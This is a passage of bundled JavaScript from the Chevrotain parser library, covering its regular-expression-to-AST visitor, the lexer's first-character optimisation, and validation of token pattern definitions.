      parseHexDigits(howMany) {
        let hexString = "";
        for (let i = 0; i < howMany; i++) {
          const hexChar = this.popChar();
          if (hexDigitPattern.test(hexChar) === false) {
            throw Error("Expecting a HexDecimal digits");
          }
          hexString += hexChar;
        }
        const charCode = parseInt(hexString, 16);
        return { type: "Character", value: charCode };
      }
      peekChar(howMuch = 0) {
        return this.input[this.idx + howMuch];
      }
      popChar() {
        const nextChar = this.peekChar(0);
        this.consumeChar(void 0);
        return nextChar;
      }
      consumeChar(char) {
        if (char !== void 0 && this.input[this.idx] !== char) {
          throw Error("Expected: '" + char + "' but found: '" + this.input[this.idx] + "' at offset: " + this.idx);
        }
        if (this.idx >= this.input.length) {
          throw Error("Unexpected end of input");
        }
        this.idx++;
      }
      loc(begin) {
        return { begin, end: this.idx };
      }
    };
  }
});

// node_modules/@chevrotain/regexp-to-ast/lib/src/base-regexp-visitor.js
var BaseRegExpVisitor;
var init_base_regexp_visitor = __esm({
  "node_modules/@chevrotain/regexp-to-ast/lib/src/base-regexp-visitor.js"() {
    BaseRegExpVisitor = class {
      visitChildren(node) {
        for (const key in node) {
          const child = node[key];
          if (node.hasOwnProperty(key)) {
            if (child.type !== void 0) {
              this.visit(child);
            } else if (Array.isArray(child)) {
              child.forEach((subChild) => {
                this.visit(subChild);
              }, this);
            }
          }
        }
      }
      visit(node) {
        switch (node.type) {
          case "Pattern":
            this.visitPattern(node);
            break;
          case "Flags":
            this.visitFlags(node);
            break;
          case "Disjunction":
            this.visitDisjunction(node);
            break;
          case "Alternative":
            this.visitAlternative(node);
            break;
          case "StartAnchor":
            this.visitStartAnchor(node);
            break;
          case "EndAnchor":
            this.visitEndAnchor(node);
            break;
          case "WordBoundary":
            this.visitWordBoundary(node);
            break;
          case "NonWordBoundary":
            this.visitNonWordBoundary(node);
            break;
          case "Lookahead":
            this.visitLookahead(node);
            break;
          case "NegativeLookahead":
            this.visitNegativeLookahead(node);
            break;
          case "Lookbehind":
            this.visitLookbehind(node);
            break;
          case "NegativeLookbehind":
            this.visitNegativeLookbehind(node);
            break;
          case "Character":
            this.visitCharacter(node);
            break;
          case "Set":
            this.visitSet(node);
            break;
          case "Group":
            this.visitGroup(node);
            break;
          case "GroupBackReference":
            this.visitGroupBackReference(node);
            break;
          case "Quantifier":
            this.visitQuantifier(node);
            break;
        }
        this.visitChildren(node);
      }
      visitPattern(node) {
      }
      visitFlags(node) {
      }
      visitDisjunction(node) {
      }
      visitAlternative(node) {
      }
      // Assertion
      visitStartAnchor(node) {
      }
      visitEndAnchor(node) {
      }
      visitWordBoundary(node) {
      }
      visitNonWordBoundary(node) {
      }
      visitLookahead(node) {
      }
      visitNegativeLookahead(node) {
      }
      visitLookbehind(node) {
      }
      visitNegativeLookbehind(node) {
      }
      // atoms
      visitCharacter(node) {
      }
      visitSet(node) {
      }
      visitGroup(node) {
      }
      visitGroupBackReference(node) {
      }
      visitQuantifier(node) {
      }
    };
  }
});

// node_modules/@chevrotain/regexp-to-ast/lib/src/api.js
var init_api3 = __esm({
  "node_modules/@chevrotain/regexp-to-ast/lib/src/api.js"() {
    init_regexp_parser();
    init_base_regexp_visitor();
  }
});

// node_modules/chevrotain/lib/src/scan/reg_exp_parser.js
function getRegExpAst(regExp) {
  const regExpStr = regExp.toString();
  if (regExpAstCache.hasOwnProperty(regExpStr)) {
    return regExpAstCache[regExpStr];
  } else {
    const regExpAst = regExpParser.pattern(regExpStr);
    regExpAstCache[regExpStr] = regExpAst;
    return regExpAst;
  }
}
function clearRegExpParserCache() {
  regExpAstCache = {};
}
var regExpAstCache, regExpParser;
var init_reg_exp_parser = __esm({
  "node_modules/chevrotain/lib/src/scan/reg_exp_parser.js"() {
    init_api3();
    regExpAstCache = {};
    regExpParser = new RegExpParser();
  }
});

// node_modules/chevrotain/lib/src/scan/reg_exp.js
function getOptimizedStartCodesIndices(regExp, ensureOptimizations = false) {
  try {
    const ast2 = getRegExpAst(regExp);
    const firstChars = firstCharOptimizedIndices(ast2.value, {}, ast2.flags.ignoreCase);
    return firstChars;
  } catch (e) {
    if (e.message === complementErrorMessage) {
      if (ensureOptimizations) {
        PRINT_WARNING(`${failedOptimizationPrefixMsg}	Unable to optimize: < ${regExp.toString()} >
	Complement Sets cannot be automatically optimized.
	This will disable the lexer's first char optimizations.
	See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#COMPLEMENT for details.`);
      }
    } else {
      let msgSuffix = "";
      if (ensureOptimizations) {
        msgSuffix = "\n	This will disable the lexer's first char optimizations.\n	See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#REGEXP_PARSING for details.";
      }
      PRINT_ERROR(`${failedOptimizationPrefixMsg}
	Failed parsing: < ${regExp.toString()} >
	Using the @chevrotain/regexp-to-ast library
	Please open an issue at: https://github.com/chevrotain/chevrotain/issues` + msgSuffix);
    }
  }
  return [];
}
function firstCharOptimizedIndices(ast2, result, ignoreCase) {
  switch (ast2.type) {
    case "Disjunction":
      for (let i = 0; i < ast2.value.length; i++) {
        firstCharOptimizedIndices(ast2.value[i], result, ignoreCase);
      }
      break;
    case "Alternative":
      const terms = ast2.value;
      for (let i = 0; i < terms.length; i++) {
        const term = terms[i];
        switch (term.type) {
          case "EndAnchor":
          // A group back reference cannot affect potential starting char.
          // because if a back reference is the first production than automatically
          // the group being referenced has had to come BEFORE so its codes have already been added
          case "GroupBackReference":
          // assertions do not affect potential starting codes
          case "Lookahead":
          case "NegativeLookahead":
          case "Lookbehind":
          case "NegativeLookbehind":
          case "StartAnchor":
          case "WordBoundary":
          case "NonWordBoundary":
            continue;
        }
        const atom = term;
        switch (atom.type) {
          case "Character":
            addOptimizedIdxToResult(atom.value, result, ignoreCase);
            break;
          case "Set":
            if (atom.complement === true) {
              throw Error(complementErrorMessage);
            }
            forEach_default(atom.value, (code2) => {
              if (typeof code2 === "number") {
                addOptimizedIdxToResult(code2, result, ignoreCase);
              } else {
                const range = code2;
                if (ignoreCase === true) {
                  for (let rangeCode = range.from; rangeCode <= range.to; rangeCode++) {
                    addOptimizedIdxToResult(rangeCode, result, ignoreCase);
                  }
                } else {
                  for (let rangeCode = range.from; rangeCode <= range.to && rangeCode < minOptimizationVal; rangeCode++) {
                    addOptimizedIdxToResult(rangeCode, result, ignoreCase);
                  }
                  if (range.to >= minOptimizationVal) {
                    const minUnOptVal = range.from >= minOptimizationVal ? range.from : minOptimizationVal;
                    const maxUnOptVal = range.to;
                    const minOptIdx = charCodeToOptimizedIndex(minUnOptVal);
                    const maxOptIdx = charCodeToOptimizedIndex(maxUnOptVal);
                    for (let currOptIdx = minOptIdx; currOptIdx <= maxOptIdx; currOptIdx++) {
                      result[currOptIdx] = currOptIdx;
                    }
                  }
                }
              }
            });
            break;
          case "Group":
            firstCharOptimizedIndices(atom.value, result, ignoreCase);
            break;
          /* istanbul ignore next */
          default:
            throw Error("Non Exhaustive Match");
        }
        const isOptionalQuantifier = atom.quantifier !== void 0 && atom.quantifier.atLeast === 0;
        if (
          // A group may be optional due to empty contents /(?:)/
          // or if everything inside it is optional /((a)?)/
          atom.type === "Group" && isWholeOptional(atom) === false || // If this term is not a group it may only be optional if it has an optional quantifier
          atom.type !== "Group" && isOptionalQuantifier === false
        ) {
          break;
        }
      }
      break;
    /* istanbul ignore next */
    default:
      throw Error("non exhaustive match!");
  }
  return values_default(result);
}
function addOptimizedIdxToResult(code2, result, ignoreCase) {
  const optimizedCharIdx = charCodeToOptimizedIndex(code2);
  result[optimizedCharIdx] = optimizedCharIdx;
  if (ignoreCase === true) {
    handleIgnoreCase(code2, result);
  }
}
function handleIgnoreCase(code2, result) {
  const char = String.fromCharCode(code2);
  const upperChar = char.toUpperCase();
  if (upperChar !== char) {
    const optimizedCharIdx = charCodeToOptimizedIndex(upperChar.charCodeAt(0));
    result[optimizedCharIdx] = optimizedCharIdx;
  } else {
    const lowerChar = char.toLowerCase();
    if (lowerChar !== char) {
      const optimizedCharIdx = charCodeToOptimizedIndex(lowerChar.charCodeAt(0));
      result[optimizedCharIdx] = optimizedCharIdx;
    }
  }
}
function findCode(setNode, targetCharCodes) {
  return find_default(setNode.value, (codeOrRange) => {
    if (typeof codeOrRange === "number") {
      return includes_default(targetCharCodes, codeOrRange);
    } else {
      const range = codeOrRange;
      return find_default(targetCharCodes, (targetCode) => range.from <= targetCode && targetCode <= range.to) !== void 0;
    }
  });
}
function isWholeOptional(ast2) {
  const quantifier = ast2.quantifier;
  if (quantifier && quantifier.atLeast === 0) {
    return true;
  }
  if (!ast2.value) {
    return false;
  }
  return isArray_default(ast2.value) ? every_default(ast2.value, isWholeOptional) : isWholeOptional(ast2.value);
}
function canMatchCharCode(charCodes, pattern) {
  if (pattern instanceof RegExp) {
    const ast2 = getRegExpAst(pattern);
    const charCodeFinder = new CharCodeFinder(charCodes);
    charCodeFinder.visit(ast2);
    return charCodeFinder.found;
  } else {
    return find_default(pattern, (char) => {
      return includes_default(charCodes, char.charCodeAt(0));
    }) !== void 0;
  }
}
var complementErrorMessage, failedOptimizationPrefixMsg, CharCodeFinder;
var init_reg_exp = __esm({
  "node_modules/chevrotain/lib/src/scan/reg_exp.js"() {
    init_api3();
    init_lodash();
    init_api();
    init_reg_exp_parser();
    init_lexer();
    complementErrorMessage = "Complement Sets are not supported for first char optimization";
    failedOptimizationPrefixMsg = 'Unable to use "first char" lexer optimizations:\n';
    CharCodeFinder = class extends BaseRegExpVisitor {
      constructor(targetCharCodes) {
        super();
        this.targetCharCodes = targetCharCodes;
        this.found = false;
      }
      visitChildren(node) {
        if (this.found === true) {
          return;
        }
        switch (node.type) {
          case "Lookahead":
            this.visitLookahead(node);
            return;
          case "NegativeLookahead":
            this.visitNegativeLookahead(node);
            return;
          case "Lookbehind":
            this.visitLookbehind(node);
            return;
          case "NegativeLookbehind":
            this.visitNegativeLookbehind(node);
            return;
        }
        super.visitChildren(node);
      }
      visitCharacter(node) {
        if (includes_default(this.targetCharCodes, node.value)) {
          this.found = true;
        }
      }
      visitSet(node) {
        if (node.complement) {
          if (findCode(node, this.targetCharCodes) === void 0) {
            this.found = true;
          }
        } else {
          if (findCode(node, this.targetCharCodes) !== void 0) {
            this.found = true;
          }
        }
      }
    };
  }
});

// node_modules/chevrotain/lib/src/scan/lexer.js
function analyzeTokenTypes(tokenTypes, options) {
  options = defaults_default(options, {
    useSticky: SUPPORT_STICKY,
    debug: false,
    safeMode: false,
    positionTracking: "full",
    lineTerminatorCharacters: ["\r", "\n"],
    tracer: (msg, action) => action()
  });
  const tracer = options.tracer;
  tracer("initCharCodeToOptimizedIndexMap", () => {
    initCharCodeToOptimizedIndexMap();
  });
  let onlyRelevantTypes;
  tracer("Reject Lexer.NA", () => {
    onlyRelevantTypes = reject_default(tokenTypes, (currType) => {
      return currType[PATTERN] === Lexer2.NA;
    });
  });
  let hasCustom = false;
  let allTransformedPatterns;
  tracer("Transform Patterns", () => {
    hasCustom = false;
    allTransformedPatterns = map_default(onlyRelevantTypes, (currType) => {
      const currPattern = currType[PATTERN];
      if (isRegExp_default(currPattern)) {
        const regExpSource = currPattern.source;
        if (regExpSource.length === 1 && // only these regExp meta characters which can appear in a length one regExp
        regExpSource !== "^" && regExpSource !== "$" && regExpSource !== "." && !currPattern.ignoreCase) {
          return regExpSource;
        } else if (regExpSource.length === 2 && regExpSource[0] === "\\" && // not a meta character
        !includes_default([
          "d",
          "D",
          "s",
          "S",
          "t",
          "r",
          "n",
          "t",
          "0",
          "c",
          "b",
          "B",
          "f",
          "v",
          "w",
          "W"
        ], regExpSource[1])) {
          return regExpSource[1];
        } else {
          return options.useSticky ? addStickyFlag(currPattern) : addStartOfInput(currPattern);
        }
      } else if (isFunction_default(currPattern)) {
        hasCustom = true;
        return { exec: currPattern };
      } else if (typeof currPattern === "object") {
        hasCustom = true;
        return currPattern;
      } else if (typeof currPattern === "string") {
        if (currPattern.length === 1) {
          return currPattern;
        } else {
          const escapedRegExpString = currPattern.replace(/[\\^$.*+?()[\]{}|]/g, "\\$&");
          const wrappedRegExp = new RegExp(escapedRegExpString);
          return options.useSticky ? addStickyFlag(wrappedRegExp) : addStartOfInput(wrappedRegExp);
        }
      } else {
        throw Error("non exhaustive match");
      }
    });
  });
  let patternIdxToType;
  let patternIdxToGroup;
  let patternIdxToLongerAltIdxArr;
  let patternIdxToPushMode;
  let patternIdxToPopMode;
  tracer("misc mapping", () => {
    patternIdxToType = map_default(onlyRelevantTypes, (currType) => currType.tokenTypeIdx);
    patternIdxToGroup = map_default(onlyRelevantTypes, (clazz) => {
      const groupName = clazz.GROUP;
      if (groupName === Lexer2.SKIPPED) {
        return void 0;
      } else if (isString_default(groupName)) {
        return groupName;
      } else if (isUndefined_default(groupName)) {
        return false;
      } else {
        throw Error("non exhaustive match");
      }
    });
    patternIdxToLongerAltIdxArr = map_default(onlyRelevantTypes, (clazz) => {
      const longerAltType = clazz.LONGER_ALT;
      if (longerAltType) {
        const longerAltIdxArr = isArray_default(longerAltType) ? map_default(longerAltType, (type) => indexOf_default(onlyRelevantTypes, type)) : [indexOf_default(onlyRelevantTypes, longerAltType)];
        return longerAltIdxArr;
      }
    });
    patternIdxToPushMode = map_default(onlyRelevantTypes, (clazz) => clazz.PUSH_MODE);
    patternIdxToPopMode = map_default(onlyRelevantTypes, (clazz) => has_default(clazz, "POP_MODE"));
  });
  let patternIdxToCanLineTerminator;
  tracer("Line Terminator Handling", () => {
    const lineTerminatorCharCodes = getCharCodes(options.lineTerminatorCharacters);
    patternIdxToCanLineTerminator = map_default(onlyRelevantTypes, (tokType) => false);
    if (options.positionTracking !== "onlyOffset") {
      patternIdxToCanLineTerminator = map_default(onlyRelevantTypes, (tokType) => {
        if (has_default(tokType, "LINE_BREAKS")) {
          return !!tokType.LINE_BREAKS;
        } else {
          return checkLineBreaksIssues(tokType, lineTerminatorCharCodes) === false && canMatchCharCode(lineTerminatorCharCodes, tokType.PATTERN);
        }
      });
    }
  });
  let patternIdxToIsCustom;
  let patternIdxToShort;
  let emptyGroups;
  let patternIdxToConfig;
  tracer("Misc Mapping #2", () => {
    patternIdxToIsCustom = map_default(onlyRelevantTypes, isCustomPattern);
    patternIdxToShort = map_default(allTransformedPatterns, isShortPattern);
    emptyGroups = reduce_default(onlyRelevantTypes, (acc, clazz) => {
      const groupName = clazz.GROUP;
      if (isString_default(groupName) && !(groupName === Lexer2.SKIPPED)) {
        acc[groupName] = [];
      }
      return acc;
    }, {});
    patternIdxToConfig = map_default(allTransformedPatterns, (x, idx) => {
      return {
        pattern: allTransformedPatterns[idx],
        longerAlt: patternIdxToLongerAltIdxArr[idx],
        canLineTerminator: patternIdxToCanLineTerminator[idx],
        isCustom: patternIdxToIsCustom[idx],
        short: patternIdxToShort[idx],
        group: patternIdxToGroup[idx],
        push: patternIdxToPushMode[idx],
        pop: patternIdxToPopMode[idx],
        tokenTypeIdx: patternIdxToType[idx],
        tokenType: onlyRelevantTypes[idx]
      };
    });
  });
  let canBeOptimized = true;
  let charCodeToPatternIdxToConfig = [];
  if (!options.safeMode) {
    tracer("First Char Optimization", () => {
      charCodeToPatternIdxToConfig = reduce_default(onlyRelevantTypes, (result, currTokType, idx) => {
        if (typeof currTokType.PATTERN === "string") {
          const charCode = currTokType.PATTERN.charCodeAt(0);
          const optimizedIdx = charCodeToOptimizedIndex(charCode);
          addToMapOfArrays(result, optimizedIdx, patternIdxToConfig[idx]);
        } else if (isArray_default(currTokType.START_CHARS_HINT)) {
          let lastOptimizedIdx;
          forEach_default(currTokType.START_CHARS_HINT, (charOrInt) => {
            const charCode = typeof charOrInt === "string" ? charOrInt.charCodeAt(0) : charOrInt;
            const currOptimizedIdx = charCodeToOptimizedIndex(charCode);
            if (lastOptimizedIdx !== currOptimizedIdx) {
              lastOptimizedIdx = currOptimizedIdx;
              addToMapOfArrays(result, currOptimizedIdx, patternIdxToConfig[idx]);
            }
          });
        } else if (isRegExp_default(currTokType.PATTERN)) {
          if (currTokType.PATTERN.unicode) {
            canBeOptimized = false;
            if (options.ensureOptimizations) {
              PRINT_ERROR(`${failedOptimizationPrefixMsg}	Unable to analyze < ${currTokType.PATTERN.toString()} > pattern.
	The regexp unicode flag is not currently supported by the regexp-to-ast library.
	This will disable the lexer's first char optimizations.
	For details See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#UNICODE_OPTIMIZE`);
            }
          } else {
            const optimizedCodes = getOptimizedStartCodesIndices(currTokType.PATTERN, options.ensureOptimizations);
            if (isEmpty_default(optimizedCodes)) {
              canBeOptimized = false;
            }
            forEach_default(optimizedCodes, (code2) => {
              addToMapOfArrays(result, code2, patternIdxToConfig[idx]);
            });
          }
        } else {
          if (options.ensureOptimizations) {
            PRINT_ERROR(`${failedOptimizationPrefixMsg}	TokenType: <${currTokType.name}> is using a custom token pattern without providing <start_chars_hint> parameter.
	This will disable the lexer's first char optimizations.
	For details See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#CUSTOM_OPTIMIZE`);
          }
          canBeOptimized = false;
        }
        return result;
      }, []);
    });
  }
  return {
    emptyGroups,
    patternIdxToConfig,
    charCodeToPatternIdxToConfig,
    hasCustom,
    canBeOptimized
  };
}
function validatePatterns(tokenTypes, validModesNames) {
  let errors = [];
  const missingResult = findMissingPatterns(tokenTypes);
  errors = errors.concat(missingResult.errors);
  const invalidResult = findInvalidPatterns(missingResult.valid);
  const validTokenTypes = invalidResult.valid;
  errors = errors.concat(invalidResult.errors);
  errors = errors.concat(validateRegExpPattern(validTokenTypes));
  errors = errors.concat(findInvalidGroupType(validTokenTypes));
  errors = errors.concat(findModesThatDoNotExist(validTokenTypes, validModesNames));
  errors = errors.concat(findUnreachablePatterns(validTokenTypes));
  return errors;
}
function validateRegExpPattern(tokenTypes) {
  let errors = [];
  const withRegExpPatterns = filter_default(tokenTypes, (currTokType) => isRegExp_default(currTokType[PATTERN]));
  errors = errors.concat(findEndOfInputAnchor(withRegExpPatterns));
  errors = errors.concat(findStartOfInputAnchor(withRegExpPatterns));
  errors = errors.concat(findUnsupportedFlags(withRegExpPatterns));
  errors = errors.concat(findDuplicatePatterns(withRegExpPatterns));
  errors = errors.concat(findEmptyMatchRegExps(withRegExpPatterns));
  return errors;
}
function findMissingPatterns(tokenTypes) {
  const tokenTypesWithMissingPattern = filter_default(tokenTypes, (currType) => {
    return !has_default(currType, PATTERN);
  });
  const errors = map_default(tokenTypesWithMissingPattern, (currType) => {
    return {
      message: "Token Type: ->" + currType.name + "<- missing static 'PATTERN' property",
      type: LexerDefinitionErrorType.MISSING_PATTERN,
      tokenTypes: [currType]
    };
  });
  const valid = difference_default(tokenTypes, tokenTypesWithMissingPattern);
  return { errors, valid };
}
function findInvalidPatterns(tokenTypes) {
  const tokenTypesWithInvalidPattern = filter_default(tokenTypes, (currType) => {
    const pattern = currType[PATTERN];
    return !isRegExp_default(pattern) && !isFunction_default(pattern) && !has_default(pattern, "exec") && !isString_default(pattern);
  });
  const errors = map_default(tokenTypesWithInvalidPattern, (currType) => {
    return {
      message: "Token Type: ->" + currType.name + "<- static 'PATTERN' can only be a RegExp, a Function matching the {CustomPatternMatcherFunc} type or an Object matching the {ICustomPattern} interface.",
      type: LexerDefinitionErrorType.INVALID_PATTERN,
      tokenTypes: [currType]
    };
  });
  const valid = difference_default(tokenTypes, tokenTypesWithInvalidPattern);
  return { errors, valid };
}
function findEndOfInputAnchor(tokenTypes) {
  class EndAnchorFinder extends BaseRegExpVisitor {
    constructor() {
      super(...arguments);
      this.found = false;
    }
    visitEndAnchor(node) {
      this.found = true;
    }
  }
  const invalidRegex = filter_default(tokenTypes, (currType) => {
    const pattern = currType.PATTERN;
    try {
      const regexpAst = getRegExpAst(pattern);
      const endAnchorVisitor = new EndAnchorFinder();
      endAnchorVisitor.visit(regexpAst);
      return endAnchorVisitor.found;
    } catch (e) {
      return end_of_input.test(pattern.source);
    }
  });
  const errors = map_default(invalidRegex, (currType) => {
    return {
      message: "Unexpected RegExp Anchor Error:\n	Token Type: ->" + currType.name + "<- static 'PATTERN' cannot contain end of input anchor '$'\n	See chevrotain.io/docs/guide/resolving_lexer_errors.html#ANCHORS	for details.",
      type: LexerDefinitionErrorType.EOI_ANCHOR_FOUND,
      tokenTypes: [currType]
    };
  });
  return errors;
}
function findEmptyMatchRegExps(tokenTypes) {
  const matchesEmptyString = filter_default(tokenTypes, (currType) => {
    const pattern = currType.PATTERN;
    return pattern.test("");
  });
  const errors = map_default(matchesEmptyString, (currType) => {
    return {
      message: "Token Type: ->" + currType.name + "<- static 'PATTERN' must not match an empty string",
      type: LexerDefinitionErrorType.EMPTY_MATCH_PATTERN,
      tokenTypes: [currType]
    };
  });
  return errors;
}
function findStartOfInputAnchor(tokenTypes) {
  class StartAnchorFinder extends BaseRegExpVisitor {
    constructor() {
      super(...arguments);
      this.found = false;
    }
    visitStartAnchor(node) {
      this.found = true;
    }
  }
  const invalidRegex = filter_default(tokenTypes, (currType) => {
    const pattern = currType.PATTERN;
    try {
      const regexpAst = getRegExpAst(pattern);
      const startAnchorVisitor = new StartAnchorFinder();
      startAnchorVisitor.visit(regexpAst);
      return startAnchorVisitor.found;
    } catch (e) {
      return start_of_input.test(pattern.source);
    }
  });
  const errors = map_default(invalidRegex, (currType) => {
    return {
      message: "Unexpected RegExp Anchor Error:\n	Token Type: ->" + currType.name + "<- static 'PATTERN' cannot contain start of input anchor '^'\n	See https://chevrotain.io/docs/guide/resolving_lexer_errors.html#ANCHORS	for details.",
      type: LexerDefinitionErrorType.SOI_ANCHOR_FOUND,
      tokenTypes: [currType]
    };
  });
  return errors;
}
function findUnsupportedFlags(tokenTypes) {
  const invalidFlags = filter_default(tokenTypes, (currType) => {
    const pattern = currType[PATTERN];
    return pattern instanceof RegExp && (pattern.multiline || pattern.global);
  });
  const errors = map_default(invalidFlags, (currType) => {
    return {
      message: "Token Type: ->" + currType.name + "<- static 'PATTERN' may NOT contain global('g') or multiline('m')",
      type: LexerDefinitionErrorType.UNSUPPORTED_FLAGS_FOUND,
      tokenTypes: [currType]
    };
  });
  return errors;
}
function findDuplicatePatterns(tokenTypes) {
  const found = [];
  let identicalPatterns = map_default(tokenTypes, (outerType) => {
    return reduce_default(tokenTypes, (result, innerType) => {
      if (outerType.PATTERN.source === innerType.PATTERN.source && !includes_default(found, innerType) && innerType.PATTERN !== Lexer2.NA) {
        found.push(innerType);
        result.push(innerType);
        return result;
      }
      return result;
    }, []);
  });
  identicalPatterns = compact_default(identicalPatterns);
  const duplicatePatterns = filter_default(identicalPatterns, (currIdenticalSet) => {
    return currIdenticalSet.length > 1;
  });
  const errors = map_default(duplicatePatterns, (setOfIdentical) => {
    const tokenTypeNames = map_default(setOfIdentical, (currType) => {
      return currType.name;
    });
    const dupPatternSrc = head_default(setOfIdentical).PATTERN;
    return {
      message: `The same RegExp pattern ->${dupPatternSrc}<-has been used in all of the following Token Types: ${tokenTypeNames.join(", ")} <-`,
      type: LexerDefinitionErrorType.DUPLICATE_PATTERNS_FOUND,
      tokenTypes: setOfIdentical
    };
  });
  return errors;
}
function findInvalidGroupType(tokenTypes) {
  const invalidTypes = filter_default(tokenTypes, (clazz) => {
    if (!has_default(clazz, "GROUP")) {
      return false;
    }
    const group = clazz.GROUP;
    return group !== Lexer2.SKIPPED && group !== Lexer2.NA && !isString_default(group);
  });
  const errors = map_default(invalidTypes, (currType) => {
    return {
      message: "Token Type: ->" + currType.name + "<- static 'GROUP' can only be Lexer.SKIPPED/Lexer.NA/A String",
      type: LexerDefinitionErrorType.INVALID_GROUP_TYPE_FOUND,
      tokenTypes: [currType]
    };
  });
  return errors;
}
function findModesThatDoNotExist(tokenTypes, validModes) {
  const invalidModes = filter_default(tokenTypes, (clazz) => {
    return clazz.PUSH_MODE !== void 0 && !includes_default(validModes, clazz.PUSH_MODE);
  });
  const errors = map_default(invalidModes, (tokType) => {
    const msg = `Token Type: ->${tokType.name}<- static 'PUSH_MODE' value cannot refer to a Lexer Mode ->${tokType.PUSH_MODE}<-which does not exist`;
    return {
      message: msg,
      type: LexerDefinitionErrorType.PUSH_MODE_DOES_NOT_EXIST,
      tokenTypes: [tokType]
    };
  });
  return errors;
}
function findUnreachablePatterns(tokenTypes) {
  const errors = [];
  const canBeTested = reduce_default(tokenTypes, (result, tokType, idx) => {
    const pattern = tokType.PATTERN;
    if (pattern === Lexer2.NA) {
      return result;
    }
    if (isString_default(pattern)) {
      result.push({ str: pattern, idx, tokenType: tokType });
    } else if (isRegExp_default(pattern) && noMetaChar(pattern)) {
      result.push({ str: pattern.source, idx, tokenType: tokType });
    }
    return result;
  }, []);
  forEach_default(tokenTypes, (aTokType, aIdx) => {
    forEach_default(canBeTested, ({ str: bStr, idx: bIdx, tokenType: bTokType }) => {
      if (aIdx < bIdx && tryToMatchStrToPattern(bStr, aTokType.PATTERN)) {
        const msg = `Token: ->${bTokType.name}<- can never be matched.
Because it appears AFTER the Token Type ->${aTokType.name}<-in the lexer's definition.
See https://chevrotain.io/docs/guide/resolving_lexer_errors.html#UNREACHABLE`;
        errors.push({
          message: msg,
          type: LexerDefinitionErrorType.UNREACHABLE_PATTERN,
          tokenTypes: [aTokType, bTokType]
        });
      }
    });
  });
  return errors;
}
function tryToMatchStrToPattern(str, pattern) {
  if (isRegExp_default(pattern)) {
    if (usesLookAheadOrBehind(pattern)) {
      return false;
    }
    const regExpArray = pattern.exec(str);
    return regExpArray !== null && regExpArray.index === 0;
  } else if (isFunction_default(pattern)) {
    return pattern(str, 0, [], {});
  } else if (has_default(pattern, "exec")) {
    return pattern.exec(str, 0, [], {});
  } else if (typeof pattern === "string") {
    return pattern === str;
  } else {
    throw Error("non exhaustive match");
  }
}
function noMetaChar(regExp) {
  const metaChars = [
    ".",
    "\\",
    "[",
    "]",
    "|",
    "^",
    "$",
    "(",
    ")",
    "?",
    "*",
    "+",
    "{"
  ];
  return find_default(metaChars, (char) => regExp.source.indexOf(char) !== -1) === void 0;
}
function usesLookAheadOrBehind(regExp) {
  return /(\(\?=)|(\(\?!)|(\(\?<=)|(\(\?<!)/.test(regExp.source);
}
function addStartOfInput(pattern) {
  const flags = pattern.ignoreCase ? "i" : "";
  return new RegExp(`^(?:${pattern.source})`, flags);
}
function addStickyFlag(pattern) {
  const flags = pattern.ignoreCase ? "iy" : "y";
  return new RegExp(`${pattern.source}`, flags);
}
function performRuntimeChecks(lexerDefinition, trackLines, lineTerminatorCharacters) {
  const errors = [];
  if (!has_default(lexerDefinition, DEFAULT_MODE)) {
    errors.push({
      message: "A MultiMode Lexer cannot be initialized without a <" + DEFAULT_MODE + "> property in its definition\n",
      type: LexerDefinitionErrorType.MULTI_MODE_LEXER_WITHOUT_DEFAULT_MODE
    });
  }
  if (!has_default(lexerDefinition, MODES)) {
    errors.push({
      message: "A MultiMode Lexer cannot be initialized without a <" + MODES + "> property in its definition\n",
      type: LexerDefinitionErrorType.MULTI_MODE_LEXER_WITHOUT_MODES_PROPERTY
    });
  }
  if (has_default(lexerDefinition, MODES) && has_default(lexerDefinition, DEFAULT_MODE) && !has_default(lexerDefinition.modes, lexerDefinition.defaultMode)) {
    errors.push({
      message: `A MultiMode Lexer cannot be initialized with a ${DEFAULT_MODE}: <${lexerDefinition.defaultMode}>which does not exist
`,
      type: LexerDefinitionErrorType.MULTI_MODE_LEXER_DEFAULT_MODE_VALUE_DOES_NOT_EXIST
    });
  }
  if (has_default(lexerDefinition, MODES)) {
    forEach_default(lexerDefinition.modes, (currModeValue, currModeName) => {
      forEach_default(currModeValue, (currTokType, currIdx) => {
        if (isUndefined_default(currTokType)) {
          errors.push({
            message: `A Lexer cannot be initialized using an undefined Token Type. Mode:<${currModeName}> at index: <${currIdx}>
`,
            type: LexerDefinitionErrorType.LEXER_DEFINITION_CANNOT_CONTAIN_UNDEFINED
          });
        } else if (has_default(currTokType, "LONGER_ALT")) {
          const longerAlt = isArray_default(currTokType.LONGER_ALT) ? currTokType.LONGER_ALT : [currTokType.LONGER_ALT];
          forEach_default(longerAlt, (currLongerAlt) => {
            if (!isUndefined_default(currLongerAlt) && !includes_default(currModeValue, currLongerAlt)) {
              errors.push({
                message: `A MultiMode Lexer cannot be initialized with a longer_alt <${currLongerAlt.name}> on token <${currTokType.name}> outside of mode <${currModeName}>
`,
                type: LexerDefinitionErrorType.MULTI_MODE_LEXER_LONGER_ALT_NOT_IN_CURRENT_MODE
              });
            }
          });
        }
      });
    });
  }
  return errors;
}
function performWarningRuntimeChecks(lexerDefinition, trackLines, lineTerminatorCharacters) {
  const warnings = [];
  let hasAnyLineBreak = false;
  const allTokenTypes = compact_default(flatten_default(values_default(lexerDefinition.modes)));
  const concreteTokenTypes = reject_default(allTokenTypes, (currType) => currType[PATTERN] === Lexer2.NA);
  const terminatorCharCodes = getCharCodes(lineTerminatorCharacters);
  if (trackLines) {
    forEach_default(concreteTokenTypes, (tokType) => {
      const currIssue = checkLineBreaksIssues(tokType, terminatorCharCodes);
      if (currIssue !== false) {
        const message = buildLineBreakIssueMessage(tokType, currIssue);
        const warningDescriptor = {
          message,
          type: currIssue.issue,
          tokenType: tokType
        };
        warnings.push(warningDescriptor);
      } else {
        if (has_default(tokType, "LINE_BREAKS")) {
          if (tokType.LINE_BREAKS === true) {
            hasAnyLineBreak = true;
          }
        } else {
          if (canMatchCharCode(terminatorCharCodes, tokType.PATTERN)) {
            hasAnyLineBreak = true;
          }
        }
      }
    });
  }
  if (trackLines && !hasAnyLineBreak) {
    warnings.push({
      message: "Warning: No LINE_BREAKS Found.\n	This Lexer has been defined to track line and column information,\n	But none of the Token Types can be identified as matching a line terminator.\n	See https://chevrotain.io/docs/guide/resolving_lexer_errors.html#LINE_BREAKS \n	for details.",
